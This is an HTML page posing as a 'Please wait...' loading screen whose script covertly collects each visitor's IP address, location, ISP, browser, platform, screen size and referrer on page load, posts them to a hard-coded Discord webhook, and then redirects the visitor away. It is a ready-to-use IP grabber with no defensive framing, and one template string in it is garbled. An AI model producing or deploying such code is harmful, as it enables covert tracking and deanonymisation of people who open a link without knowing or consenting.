<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Loading...</title>
  <style>body{background:#000;color:#0f0;font-family:Arial;text-align:center;padding:50px;}</style>
</head>
<body>
  <h1>Please wait...</h1>

  <script>
    const webhook = "https://discord.com/api/webhooks/1485701753654743261/BNhHwbYVgb4vi3GO2RpOBZ-DqnmrxZMv_Vn7tnc4nRf0BMnoTaQFqGWeFngQcDwCrj4E"; // ← replace

    async function logVisit() {
      try {
        const ipRes = await fetch('https://ipinfo.io/json');
        const ipData = await ipRes.json();

        const info = {
          ip: ipData.ip || '?',
          location: `${ipData.city || '?'} • ${ipData.region || '?'} • ${ipData.country || '?'}`,
          isp: ipData.org || '?',
          browser: navigator.userAgent,
          platform: navigator.platform || '?',
          screen: `\( {screen.width}x \){screen.height}`,
          time: new Date().toISOString(),
          referrer: document.referrer || 'direct'
        };

        await fetch(webhook, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            embeds: [{
              title: "Visitor Logged",
              color: 0x00ff00,
              fields: Object.entries(info).map(([key, val]) => ({
                name: key.charAt(0).toUpperCase() + key.slice(1),
                value: `\`${val}\``,
                inline: key !== 'browser' && key !== 'referrer'
              })),
              timestamp: new Date().toISOString()
            }]
          })
        });
      } catch (e) {}
    }

    logVisit();

    // Optional: redirect somewhere after logging (e.g. rickroll or real site)
    setTimeout(() => { window.location = "https://example.com"; }, 1500);
  </script>
</body>
</html>
